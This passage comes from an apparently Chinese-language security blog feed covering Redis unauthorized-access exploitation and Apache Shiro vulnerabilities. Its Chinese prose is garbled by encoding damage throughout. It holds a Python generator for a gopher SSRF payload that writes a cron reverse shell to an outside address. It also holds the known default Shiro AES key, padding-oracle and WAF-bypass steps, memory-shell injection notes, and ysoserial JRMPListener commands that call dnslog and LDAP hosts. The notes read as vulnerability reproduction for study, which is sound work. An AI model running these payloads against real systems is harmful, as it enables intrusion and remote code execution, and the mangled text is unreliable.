0&gt;&amp;1\n\n\n\n&quot;</span>%(reverse_ip,reverse_port)</span><br><span class="line">filename=<span class="string">&quot;root&quot;</span></span><br><span class="line">path=<span class="string">&quot;/var/spool/cron&quot;</span></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">passwd=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">cmd=[<span class="string">&quot;flushall&quot;</span>,</span><br><span class="line">     <span class="string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="built_in">format</span>(shell.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class="line">     <span class="string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="built_in">format</span>(path),</span><br><span class="line">     <span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="built_in">format</span>(filename),</span><br><span class="line">     <span class="string">&quot;save&quot;</span></span><br><span class="line">     ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># å¦‚æœrediséœ€è¦è®¤è¯ï¼Œå°±åœ¨cmdç¬¬ä¸€è¡Œæ’å…¥è®¤è¯å‘½ä»¤</span></span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">    cmd.insert(<span class="number">0</span>,<span class="string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="built_in">format</span>(passwd))</span><br><span class="line">    </span><br><span class="line">payload=protocol+ip+<span class="string">&quot;:&quot;</span>+port+<span class="string">&quot;/_&quot;</span>  <span class="comment"># &quot;/_&quot; gopheråè®®ç‰¹æ€§ï¼Œä¼šåƒæ‰urlåçš„ä¸€ä¸ªå­—ç¬¦</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">redis_format</span>(<span class="params">arr</span>):</span><br><span class="line">    CRLF=<span class="string">&quot;\r\n&quot;</span></span><br><span class="line">    redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd=<span class="string">&quot;&quot;</span></span><br><span class="line">    cmd+=<span class="string">&quot;*&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(redis_arr))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">        cmd+=CRLF+<span class="string">&quot;$&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd+=CRLF</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">        payload += urllib.parse.quote(redis_format(x))</span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure><h1 id="Windowsä¸‹çš„æ€è·¯â€“æ²¡è¯•"><a href="#Windowsä¸‹çš„æ€è·¯â€“æ²¡è¯•" class="headerlink" title="Windowsä¸‹çš„æ€è·¯â€“æ²¡è¯•"></a>Windowsä¸‹çš„æ€è·¯â€“æ²¡è¯•</h1><p><strong>Windowsçš„Redisç‰ˆæœ¬åœç•™åœ¨3.2</strong></p><p><strong>Windowsçš„è‡ªå¯åŠ¨ï¼šç³»ç»ŸæœåŠ¡ã€è®¡åˆ’ä»»åŠ¡ã€æ³¨å†Œè¡¨å¯åŠ¨é¡¹ã€ç”¨æˆ·çš„startupç›®å½•</strong></p><p><a href="https://xz.aliyun.com/t/7940">è¸©å‘è®°å½•-Redis(Windows)çš„getshell - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p><h1 id="æ¼æ´åˆ©ç”¨å·¥å…·"><a href="#æ¼æ´åˆ©ç”¨å·¥å…·" class="headerlink" title="æ¼æ´åˆ©ç”¨å·¥å…·"></a>æ¼æ´åˆ©ç”¨å·¥å…·</h1><p><a href="https://github.com/yuyan-sec/RedisEXP">yuyan-sec&#x2F;RedisEXP: Redis æ¼æ´åˆ©ç”¨å·¥å…· (github.com)</a></p><p><a href="https://github.com/n0b0dyCN/redis-rogue-server">n0b0dyCN&#x2F;redis-rogue-server: Redis(&lt;&#x3D;5.0.5) RCE (github.com)</a></p><h1 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h1><p><a href="https://xz.aliyun.com/t/7974#toc-19">æµ…æLinuxä¸‹Redisçš„æ”»å‡»é¢(ä¸€) - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p><p><a href="https://xz.aliyun.com/t/11198#toc-5">redisæœªæˆæƒåˆ°shiroååºåˆ—åŒ– - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p><p><a href="https://nosec.org/home/detail/5041.html">redisæœªæˆæƒåˆ°shiroååºåˆ—åŒ–ä¹‹sessionå›æ˜¾é©¬|NOSECå®‰å…¨è®¯æ¯å¹³å° - ç™½å¸½æ±‡å®‰å…¨ç ”ç©¶é™¢</a></p><p><a href="https://xz.aliyun.com/t/5665#toc-16">æµ…æRedisä¸­SSRFçš„åˆ©ç”¨ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´å¤ç° </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Shiroæ¼æ´</title>
      <link href="/2023/05/03/shiro%E6%BC%8F%E6%B4%9E/"/>
      <url>/2023/05/03/shiro%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="Shiroæ¦‚è¿°"><a href="#Shiroæ¦‚è¿°" class="headerlink" title="Shiroæ¦‚è¿°"></a>Shiroæ¦‚è¿°</h1><p>â€‹Apache Shiroæ˜¯ä¸€ä¸ªå¼€æº<strong>å®‰å…¨æ¡†æ¶</strong>ï¼Œæä¾›èº«ä»½éªŒè¯ã€æˆæƒã€å¯†ç å­¦å’Œä¼šè¯ç®¡ç†ã€‚Shiroæ¡†æ¶ç›´è§‚ã€æ˜“ç”¨ï¼ŒåŒæ—¶ä¹Ÿèƒ½æä¾›å¥å£®çš„å®‰å…¨æ€§ã€‚</p><p>â€‹é€šå¸¸ä¸tomcatä¸€èµ·ä½¿ç”¨ï¼Œä¹Ÿå¯ä»¥æ›¿æ¢spring securityé›†æˆåˆ°springä¸­ï¼ˆå¦‚è‹¥ä¾ï¼‰ã€‚</p><h1 id="æ¡†æ¶ç‰¹å¾"><a href="#æ¡†æ¶ç‰¹å¾" class="headerlink" title="æ¡†æ¶ç‰¹å¾"></a>æ¡†æ¶ç‰¹å¾</h1><p>åœ¨è¯·æ±‚åŒ…çš„Cookieä¸­æœ‰rememberMeå­—æ®µèµ‹ä»»æ„å€¼ï¼Œæ”¶åˆ°è¿”å›åŒ…çš„ Set-Cookie ä¸­å­˜åœ¨<code>rememberMe=deleteMe</code>å­—æ®µï¼Œè¯´æ˜ç›®æ ‡æœ‰ä½¿ç”¨Shiroæ¡†æ¶</p><p><img src="/../images/image-20230623161016099.png" alt="image-20230623161016099"></p><h1 id="ååºåˆ—åŒ–æ¼æ´"><a href="#ååºåˆ—åŒ–æ¼æ´" class="headerlink" title="ååºåˆ—åŒ–æ¼æ´"></a>ååºåˆ—åŒ–æ¼æ´</h1><p>â€‹Apache Shiroæ¡†æ¶æä¾›äº†è®°ä½å¯†ç çš„åŠŸèƒ½ï¼ˆRememberMeï¼‰ï¼Œç”¨æˆ·ç™»å½•æˆåŠŸåä¼šç”Ÿæˆç»è¿‡åŠ å¯†å¹¶ç¼–ç çš„cookieã€‚</p><p>åœ¨æœåŠ¡ç«¯å¯¹rememberMeçš„cookieå€¼çš„å¤„ç†</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">RememberMe Cookieå€¼ =&gt; base64è§£ç  =&gt; AESè§£å¯† =&gt; ååºåˆ—åŒ–</span><br></pre></td></tr></table></figure><p><strong>å¦‚æœçŸ¥é“AESçš„å¯†é’¥</strong>å°±å¯ä»¥æ„é€ æ¶æ„<code>cookie</code>ï¼Œä»è€Œé€ æˆååºåˆ—åŒ–RCEæ¼æ´ã€‚æ‰€ä»¥è¿™ä¹Ÿæ˜¯shiroååºåˆ—åŒ–ç»ä¹…ä¸è¡°çš„åŸå› ã€‚</p><p>payloadç”Ÿæˆ</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">æ¶æ„ç±» =&gt; åºåˆ—åŒ– =&gt; AESåŠ å¯† =&gt; base64ç¼–ç </span><br></pre></td></tr></table></figure><h2 id="shiro-550"><a href="#shiro-550" class="headerlink" title="shiro-550"></a>shiro-550</h2><p>â€‹Apache Shiro 1.2.5ä¹‹å‰çš„ç‰ˆæœ¬åœ¨<code>org.apache.shiro.mgt.AbstractRememberMeManager</code>ä¸­å­˜åœ¨AESé»˜è®¤ç§˜é’¥<code>kPH+bIxk5D2deZiIxcaaaA==</code>ã€‚</p><p>â€‹åœ¨ä¹‹åçš„ç‰ˆæœ¬ï¼Œå¯†é’¥ä¸ºéšæœºç”Ÿæˆçš„ï¼Œä½†æ˜¯æŒ¡ä¸ä½å¼€å‘äººå‘˜çš„å®‰å…¨æ„è¯†ä¸åˆ°ä½ã€‚</p><h2 id="shiro-721"><a href="#shiro-721" class="headerlink" title="shiro-721"></a>shiro-721</h2><ul><li>æ¦‚è¿°</li></ul><p>â€‹Apache Shiro 1.4.2ä¹‹å‰çš„ç‰ˆæœ¬é»˜è®¤ä½¿ç”¨AES&#x2F;CBC&#x2F;PKCS5Paddingæ¨¡å¼åŠ å¯†ï¼Œè¯¥åŠ å¯†æ¨¡å¼å­˜åœ¨ç¼ºé™·ï¼Œå½“æ”»å‡»è€…<strong>è·å¾—ä¸€ä¸ªæœ‰æ•ˆçš„rememberMe Cookieå€¼æ—¶</strong>ï¼Œå¯ä»¥é€šè¿‡Padding Oracle Attackæ„é€ æœ‰æ•ˆçš„æ¶æ„åºåˆ—åŒ–æ•°æ®æ¥å‘èµ·æ”»å‡»ã€‚</p><ul><li><p>å¤ç°</p><blockquote><p>å‚è€ƒ<a href="https://github.com/inspiringz/Shiro-721">inspiringz&#x2F;Shiro-721: Shiro-721 RCE Via RememberMe Padding Oracle Attack (github.com)</a></p><p>æ³¨æ„ç‚¹ï¼šå› ä¸ºçˆ†ç ´çš„æ—¶é—´å¤ªé•¿ï¼ˆå‡ ä¸ªå°æ—¶ï¼‰ï¼Œä¸é€‚ç”¨äºå®é™…ç¯å¢ƒçš„æµ‹è¯•ã€‚ä¼šæŠŠç¯å¢ƒæ‰“å´©æˆ–è€…ipè¢«ban</p></blockquote><ul><li>æ­£å¸¸ç™»å½•ç½‘ç«™ï¼ˆå‹¾é€‰Rememberï¼‰ï¼Œå¹¶ä»Cookieä¸­è·å–åˆæ³•çš„RememberMeã€‚</li><li>ä½¿ç”¨RememberMe cookieä½œä¸ºPadding Oracle Attackçš„å‰ç¼€ã€‚</li><li>åŠ å¯† ysoserial çš„åºåˆ—åŒ– payloadï¼Œé€šè¿‡Padding Oracle Attackåˆ¶ä½œæ¶æ„RememberMeã€‚</li><li>é‡æ”¾æ¶æ„RememberMe cookieï¼Œä»¥æ‰§è¡Œååºåˆ—åŒ–æ”»å‡»ã€‚</li></ul></li><li><p>ä¿®å¤</p><p>åœ¨ä¹‹åçš„ç‰ˆæœ¬åŠ å¯†æ¨¡å¼ AES-CBCè¢«æ›´æ¢ä¸º AES-GCMï¼Œæ‰€ä»¥åœ¨ä½¿ç”¨å·¥å…·ç­‰æ—¶éœ€è¦æ³¨æ„è¯¥åŠ å¯†æ¨¡å¼çš„å˜åŒ–ã€‚</p></li></ul><h1 id="ååºåˆ—åŒ–æ¼æ´å¸¸è§é—®é¢˜"><a href="#ååºåˆ—åŒ–æ¼æ´å¸¸è§é—®é¢˜" class="headerlink" title="ååºåˆ—åŒ–æ¼æ´å¸¸è§é—®é¢˜"></a>ååºåˆ—åŒ–æ¼æ´å¸¸è§é—®é¢˜</h1><h2 id="å¯†é’¥è·å–"><a href="#å¯†é’¥è·å–" class="headerlink" title="å¯†é’¥è·å–"></a>å¯†é’¥è·å–</h2><ul><li><p>githubæ”¶é›†</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">securityManager.rememberMeManager.cipherKey</span><br><span class="line">cookieRememberMeManager.setCipherKey</span><br><span class="line">setCipherKey(Base64.decode</span><br></pre></td></tr></table></figure></li><li><p>ä»»æ„æ–‡ä»¶è¯»å–&#x2F;ä¸‹è½½</p></li><li><p>heapdump</p></li><li><p>çˆ†ç ´</p><p>ä½¿ç”¨ä¸€ä¸ªç©ºçš„ <code>SimplePrincipalCollection</code>ä½œä¸º payloadï¼Œåºåˆ—åŒ–åä½¿ç”¨å¾…æ£€æµ‹çš„ç§˜é’¥è¿›è¡ŒåŠ å¯†å¹¶å‘é€ã€‚</p><p>å½“å¯†é’¥æ­£ç¡®æ—¶<strong>ä¸è¿”å›</strong>deleteMe </p><p><img src="/../images/image-20230909224050081.png" alt="image-20230909224050081"></p><p>å¯†é’¥é”™è¯¯æ—¶<strong>è¿”å›</strong> deleteMe</p><p><img src="/../images/image-20230909224225905.png" alt="image-20230909224225905"></p><p>è¿˜æœ‰ä¸€ç§æƒ…å†µï¼Œå¦‚æœç§˜é’¥æ­£ç¡®è¿”å›çš„æ˜¯ä¸€ä¸ª <code>deleteMe</code>ï¼Œå¯†é’¥é”™è¯¯è¿”å›çš„æ˜¯ä¸¤ä¸ª <code>deleteMe</code>ã€‚</p></li></ul><h2 id="WAFç»•è¿‡"><a href="#WAFç»•è¿‡" class="headerlink" title="WAFç»•è¿‡"></a>WAFç»•è¿‡</h2><h3 id="cookieå†…å®¹æ£€æµ‹"><a href="#cookieå†…å®¹æ£€æµ‹" class="headerlink" title="cookieå†…å®¹æ£€æµ‹"></a>cookieå†…å®¹æ£€æµ‹</h3><ul><li><p>Tomcat 9.0.19</p><p>æ’å…¥\x0d</p><p><img src="/../images/7.png" alt="img"></p></li><li><p>æ’å…¥Base64åƒåœ¾æ•°æ®ç»•è¿‡ï¼ˆFUZZï¼‰</p></li></ul><p><img src="/../images/image-20230909230652318.png" alt="image-20230909230652318"></p><p><img src="/../images/image-20230909230621472.png" alt="image-20230909230621472"></p><p><img src="/../images/image-20230909230736285.png" alt="image-20230909230736285"></p><ul><li><p>æœªçŸ¥httpè¯·æ±‚</p><p>æœªçŸ¥httpè¯·æ±‚æ—¶ï¼Œshiroæ˜¯å…ˆå¤„ç†cookieååœ¨åˆ°servletï¼Œæ‰€ä»¥rememberMeå€¼æ˜¯ä¼šå¤„ç†çš„</p><p><img src="/../images/image-20230930210650227.png" alt="image-20230930210650227"></p></li></ul><h3 id="è¯·æ±‚å¤´å¤§å°è¢«é™åˆ¶"><a href="#è¯·æ±‚å¤´å¤§å°è¢«é™åˆ¶" class="headerlink" title="è¯·æ±‚å¤´å¤§å°è¢«é™åˆ¶"></a>è¯·æ±‚å¤´å¤§å°è¢«é™åˆ¶</h3><blockquote><p>tomcaté»˜è®¤headeræœ€å¤§é•¿åº¦è®¾ç½®ä¸º8192å­—èŠ‚</p><p>äººä¸ºå¯¹Cookieé•¿åº¦è¿›è¡Œé™åˆ¶</p><p>è§£å†³æ€è·¯ï¼š</p><p><img src="/../images/image-20230910143028324.png" alt="image-20230910143028324"></p><ul><li><a href="https://blog.csdn.net/Thunderclap_/article/details/128932553">shiroçš„payloadé•¿åº¦é™åˆ¶ç»•è¿‡-CSDNåšå®¢</a></li><li><a href="https://mp.weixin.qq.com/s/OY9x2EYqIxPNABwGQNVkcw">æµ…æShiroååºåˆ—åŒ–Payloadé•¿åº¦ç»•è¿‡ (qq.com)</a></li></ul></blockquote><h4 id="ç¬¬ä¸€ç§è§£å†³æ–¹æ³•å¤ç°"><a href="#ç¬¬ä¸€ç§è§£å†³æ–¹æ³•å¤ç°" class="headerlink" title="ç¬¬ä¸€ç§è§£å†³æ–¹æ³•å¤ç°"></a>ç¬¬ä¸€ç§è§£å†³æ–¹æ³•å¤ç°</h4><p>Tomcatå…è®¸çš„HTTP Headeræœ€å¤§å€¼<code>maxHttpHeaderSize</code></p><p>headerè¿‡é•¿ï¼ŒæœåŠ¡ç«¯æŠ¥400é”™è¯¯</p><p><img src="/../images/image-20230930165929950.png" alt="image-20230930165929950"></p><p><img src="/../images/image-20230930170008618.png" alt="image-20230930170008618"></p><p><strong>æ„é€ headerå¤´çš„ç±»æ„é€ å™¨</strong></p><p><img src="/../images/image-20230930174546037.png" alt="image-20230930174546037"></p><p><strong>æ„é€ CBé“¾è¿›è¡Œåºåˆ—åŒ–</strong></p><p><img src="/../images/image-20230930174635485.png" alt="image-20230930174635485"></p><p><strong>å°†test.binæ–‡ä»¶è¿›è¡Œå¤„ç†</strong></p><p><img src="/../images/image-20230930175016176.png" alt="image-20230930175016176"></p><p><strong>ç”Ÿæˆå¤–éƒ¨å­—èŠ‚ç å†…å®¹</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">public class CalcTest &#123;</span><br><span class="line">    public CalcTest() throws Exception &#123;</span><br><span class="line">        Runtime.getRuntime().<span class="built_in">exec</span>(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">javac CalcTest.java</span><br><span class="line"><span class="built_in">cat</span> CalcTest.class |<span class="built_in">base64</span>|sed <span class="string">&#x27;:label;N;s/\n//;b label&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>å‘é€payload</strong></p><p><img src="/../images/image-20230930175509511.png" alt="image-20230930175509511"></p><p><strong>äººå®¶å·¥å…·å·²ç»å®ç°äº†</strong></p><p>æ³¨å…¥å†…å­˜é©¬</p><p><img src="/../images/image-20230930180023456.png" alt="image-20230930180023456"></p><h2 id="æœ‰keyæ— é“¾"><a href="#æœ‰keyæ— é“¾" class="headerlink" title="æœ‰keyæ— é“¾"></a>æœ‰keyæ— é“¾</h2><blockquote><p> ç”¨ç°åœ¨å…¬å¼€çš„ dnsæˆ–è€…å»¶è¿Ÿæ¢æµ‹ çˆ†ç ´è¯•æ¢å­˜åœ¨çš„classåŒ… å·¥å…·éƒ½ç°æˆçš„ </p><p>ç„¶åæ ¹æ®å­˜åœ¨çš„åŒ…åˆ¤æ–­ç‰ˆæœ¬å·®å¼‚è‡ªå·±æ„é€ ç»„åˆé“¾ éƒ½çŸ¥é“å®˜æ–¹é“¾æ–¹ä¾¿ç›¯ç€å…³é”®å‡½æ•°ï¼Œé€šç”¨çš„rceé“¾åŸºæœ¬éƒ½è—ç€å®˜æ–¹ä¿®å¤éƒ½æ²¡å¾—ç© </p><p>ç°åœ¨æ¯”è¾ƒå¤šçš„æ˜¯åˆ©ç”¨ç¬¬ä¸‰æ–¹æœåŠ¡æ¯”å¦‚mysql redis jdbc é€šè¿‡æœ‰é™æ“ä½œçš„é“¾å»åˆ©ç”¨</p></blockquote><p>é“¾å­å¤šçš„å·¥å…·ï¼šshiro-tool ï¼Œç»å¸¸è¯†åˆ«å‡ºJRMP Cilentï¼ˆğŸ¥¦ğŸ•åªä¼šç”¨å·¥å…·ï¼‰</p><p><a href="https://mp.weixin.qq.com/s/Hm2HA4G2r6ZFgxdddJ6Puw">shiroååºåˆ—æ¼æ´ä¸­JRMPClientåˆ©ç”¨ (qq.com)</a></p><p><a href="https://sumsec.me/2021/shiro-JRMP-gadget.html">shiro JRMP gadget | BlogPapers (sumsec.me)</a></p><p>ysoserialèµ·JRMPæœåŠ¡</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> ysoserial-all.jar ysoserial.exploit.JRMPListener 6789 CommonsCollections5 <span class="string">&quot;ping w3dh1h.dnslog.cn&quot;</span></span><br><span class="line"></span><br><span class="line">java -<span class="built_in">cp</span> ysoserial-0.0.6-SNAPSHOT-1.8.3.jar  ysoserial.exploit.JRMPListener 8088 CommonsBeanutils2 <span class="string">&quot;ldap://ip:1389/Basic/Command/Whoami&quot;</span></span><br></pre></td></tr></table></figure><p>ç”±äºShiroé‡å†™äº†resolveClassæ–¹æ³•ï¼Œå°†åŸç”Ÿæ–¹æ³•ä¸­çš„forNameæ–¹æ³•æ›¿æ¢ä¸ºloadClassæ–¹æ³•ï¼Œç”±äºloadClassæ— æ³•åŠ è½½æ•°ç»„ç±»å‹çš„ç±»ï¼Œå› æ­¤å­˜åœ¨Transformer[]ç±»çš„CommonCollections gadgetæ— æ³•æˆåŠŸåˆ©ç”¨æ­¤æ¼æ´ï¼Œï¼ˆä¾‹å¦‚ysoserial CommonCollections1ã€CommonCollections3ï¼‰</p><p>æ€è·¯ï¼š</p><p><img src="/../images/1645693858000-8awcri.png-w331s" alt="image-20220221183250833"></p><p><strong>shiroé»˜è®¤æ˜¯æ²¡æœ‰ccä¾èµ–çš„ï¼Œä½†æ˜¯å­˜åœ¨commons-beanutils 1.8.3ä¾èµ–</strong></p><h2 id="å·¥å…·è¯†åˆ«é—®é¢˜"><a href="#å·¥å…·è¯†åˆ«é—®é¢˜" class="headerlink" title="å·¥å…·è¯†åˆ«é—®é¢˜"></a>å·¥å…·è¯†åˆ«é—®é¢˜</h2><ul><li><p>æ¯”å¦‚302è·³è½¬ï¼Œburpæ’ä»¶è¯†åˆ«å‡ºæ¥äº†ï¼Œä½†æ˜¯å·¥å…·è¯†åˆ«ä¸å‡ºæ¥</p><p>è§£å†³ï¼šå·¥å…·èµ°burpä»£ç†ï¼Œå°†å“åº”302æ”¹ä¸º200</p></li></ul><h1 id="èº«ä»½éªŒè¯ç»•è¿‡æ¼æ´"><a href="#èº«ä»½éªŒè¯ç»•è¿‡æ¼æ´" class="headerlink" title="èº«ä»½éªŒè¯ç»•è¿‡æ¼æ´"></a>èº«ä»½éªŒè¯ç»•è¿‡æ¼æ´</h1><h2 id="shiroæƒé™ç®¡ç†åŸç†"><a href="#shiroæƒé™ç®¡ç†åŸç†" class="headerlink" title="shiroæƒé™ç®¡ç†åŸç†"></a>shiroæƒé™ç®¡ç†åŸç†</h2><p><strong>Shiroçš„è®¤è¯æˆæƒæµç¨‹</strong></p><p><img src="/../images/20230628170326-a47052ce-1592-1.png" alt="20230628170326-a47052ce-1592-1"></p><blockquote><p>å½“æˆ‘ä»¬çš„ç”¨æˆ·(subject)å»è®¤è¯çš„æ—¶å€™ï¼Œç”¨æˆ·æºå¸¦æˆ‘ä»¬çš„èº«ä»½ä¿¡æ¯ï¼Œå‡­æ®ä¿¡æ¯ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬çš„ç”¨æˆ·åå’Œå¯†ç </p><p>Shiroä¼šå°†æˆ‘ä»¬çš„ç”¨æˆ·åå’Œå¯†ç å°è£…æˆä¸€ä¸ªToken</p><p>ç„¶åé€šè¿‡å®‰å…¨ç®¡ç†å™¨(SecurityManager)</p><p>å®‰å…¨ç®¡ç†å™¨(SecurityManager)å»è°ƒç”¨è®¤è¯å™¨(Authenticator)</p><p>è®¤è¯å™¨(Authenticator)å»è°ƒç”¨æˆ‘ä»¬çš„Realmå»è·å–æ•°æ®ï¼Œç„¶åè¿›è¡Œæ¯”å¯¹ï¼Œå¦‚æœå¯¹æ¯”æˆåŠŸçš„è¯ï¼Œé‚£ä¹ˆå°±è®¤è¯æˆåŠŸäº†ï¼Œå¦åˆ™è®¤è¯å¤±è´¥ã€‚</p><p>è®¤è¯æˆåŠŸåä¼šè°ƒç”¨æˆæƒå™¨ï¼ˆAuthorizerï¼‰æ¥åˆ¤æ–­è¿™ä¸ªç”¨æˆ·èº«ä»½æœ‰ä»€ä¹ˆæƒé™ï¼Œä»–å¯ä»¥è®¿é—®å“ªäº›èµ„æºã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SessionManageræ˜¯ä¸€ä¸ªä¼šè¯ç®¡ç†å™¨ï¼Œï¼Œshiroæ¡†æ¶å®šä¹‰äº†ä¸€å¥—ä¼šè¯ç®¡ç†ï¼Œ å®ƒä¸ä¾èµ–webå®¹å™¨çš„sessionï¼Œæ‰€ä»¥shiroå¯ä»¥ä½¿ç”¨åœ¨éweb åº”ç”¨ä¸Šï¼Œä¹Ÿå¯ä»¥å°†åˆ†å¸ƒå¼åº”ç”¨çš„ä¼šè¯é›†ä¸­åœ¨ä¸€ç‚¹ç®¡ç†ï¼Œæ­¤ ç‰¹æ€§å¯ä½¿å®ƒå®ç°å•ç‚¹ç™»å½•ã€‚</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SessionDAOå…¶å®å°±æ˜¯ä¼šè¯ï¼Œæ¯”å¦‚è¦å°†Sessionå­˜å‚¨åˆ°æ•°æ®åº“ï¼Œé‚£ä¹ˆå¯ä»¥é€šè¿‡jdbcæ¥å­˜å‚¨åˆ°æ•°æ®åº“ã€‚</span><br></pre></td></tr></table></figure></blockquote><p>Spring+Shiroå…³é”®ä»£ç </p><p><strong>shiro.ini</strong></p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[users]</span></span><br><span class="line"><span class="attr">user</span>=user,user</span><br><span class="line"><span class="attr">admin</span>=admin,admin</span><br><span class="line"></span><br><span class="line"><span class="section">[roles]</span></span><br><span class="line"><span class="attr">admin</span>=*</span><br><span class="line"><span class="attr">user</span>=user</span><br></pre></td></tr></table></figure><p>å®šä¹‰äº†ä¸¤ä¸ªç”¨æˆ·å’Œä¸¤ä¸ªè§’è‰²ã€‚å…¶ä¸­ï¼Œadminè§’è‰²æ‹¥æœ‰æ‰€æœ‰æƒé™ï¼Œè€Œuserè§’è‰²åªæ‹¥æœ‰useræƒé™ã€‚è¿™æ„å‘³ç€adminç”¨æˆ·å…·æœ‰æ‰€æœ‰æƒé™ï¼Œè€Œuserç”¨æˆ·ä»…å…·æœ‰useræƒé™</p><p><strong>Filteré“¾</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ShiroFilterFactoryBean</span> <span class="variable">shiroFilterFactoryBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ShiroFilterFactoryBean</span>();</span><br><span class="line"><span class="comment">//ç»™filterè®¾ç½®å®‰å…¨ç®¡ç†å™¨</span></span><br><span class="line">shiroFilterFactoryBean.setSecurityManager(defaultWebSecurityManager);</span><br><span class="line"></span><br><span class="line"><span class="comment">//é…ç½®è·¯å¾„è®¿é—®</span></span><br><span class="line">Map&lt;String,String&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String,String&gt;();</span><br><span class="line">map.put(<span class="string">&quot;/secret.html&quot;</span>, <span class="string">&quot;authc, roles[admin]&quot;</span>);</span><br><span class="line">map.put(<span class="string">&quot;/**&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//é»˜è®¤è®¤è¯ç•Œé¢è·¯å¾„---å½“è®¤è¯ä¸é€šè¿‡æ—¶è·³è½¬</span></span><br><span class="line">shiroFilterFactoryBean.setLoginUrl(<span class="string">&quot;/login.html&quot;</span>);</span><br><span class="line">shiroFilterFactoryBean.setUnauthorizedUrl(<span class="string">&quot;/unauthorized.html&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// è®¾ç½®URLè·¯å¾„ä¸è¿‡æ»¤å™¨çš„æ˜ å°„å…³ç³»</span></span><br><span class="line">shiroFilterFactoryBean.setFilterChainDefinitionMap(map);</span><br></pre></td></tr></table></figure><p><strong>è§£é‡Š</strong></p><p>æ‰€æœ‰ä»¥ <code>/</code> å¼€å¤´çš„è·¯å¾„ï¼ˆåŒ…æ‹¬å­è·¯å¾„ï¼‰éƒ½å¯ä»¥åŒ¿åè®¿é—®ï¼Œæ— éœ€è®¤è¯å’Œæˆæƒã€‚ä½†æ˜¯ï¼Œåªæœ‰ç»è¿‡è®¤è¯çš„ç”¨æˆ·å¹¶æœ‰<code>admin</code> è§’è‰²æˆæƒæ‰èƒ½è®¿é—® <code>/secret.html</code> è·¯å¾„ï¼Œå½“æœªç»èº«ä»½éªŒè¯çš„ç”¨æˆ·è®¿é—®éœ€è¦èº«ä»½éªŒè¯çš„èµ„æºå¦‚<code>/secret.html</code>æ—¶å°†è¢«é‡å®šå‘åˆ°<code>/login.html</code>ï¼Œå½“ç»è¿‡èº«ä»½éªŒè¯çš„ç”¨æˆ·ï¼ˆuserï¼‰è®¿é—®ä¸ç¬¦åˆå…¶è®¿é—®æƒé™çš„èµ„æº<code>/secret.html</code>æ—¶å°†è¢«é‡å®šå‘åˆ°<code>/unauthorized.html</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// AntPathMatcheråŒ¹é…è§„åˆ™</span></span><br><span class="line">?  åŒ¹é…ä»»æ„ä¸€ä¸ªå•å­—ç¬¦</span><br><span class="line">*  åŒ¹é…ä»»æ„æ•°é‡çš„å­—ç¬¦ å³/admin<span class="comment">/* å¯ä»¥åŒ¹é… /admin/a ä½†æ˜¯ä¸èƒ½åŒ¹é… /admin/b/c/d</span></span><br><span class="line"><span class="comment">** åŒ¹é…ä¸€ä¸ªæˆ–å¤šä¸ªç›®å½• å³/admin/** å¯ä»¥åŒ¹é… /admin/a æˆ–è€… /admin/b/c/d ç­‰è¯·æ±‚</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">// å¸¸è§è¿‡æ»¤å™¨</span></span><br><span class="line"><span 